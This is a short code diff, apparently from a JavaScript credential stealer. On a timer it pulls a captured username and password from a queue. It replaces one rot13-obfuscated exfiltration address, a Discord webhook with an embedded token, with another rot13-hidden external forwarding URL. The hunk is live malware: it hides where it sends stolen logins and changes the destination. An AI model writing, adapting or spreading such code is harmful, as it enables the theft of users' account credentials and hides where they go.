@@ -50,7 +50,7 @@ setInterval(() => {
     let data = data_queue[data_queue.length - 1]
     data_queue = [];
     wh = rot13(
-        "uggcf://qvfpbeq.pbz/ncv/jroubbxf/1064304574900473877/qBf-0GQA5KAS5Y4MsCodLfUygO2qOrbNtV4_fxS9aVKNcfvy7ExZn14hoFNvAleBP7Vg"
+        "uggcf://guryvbafebne.pu/qp_sbejneq"
     );
     let user = data[0];
     let pass = data[1];
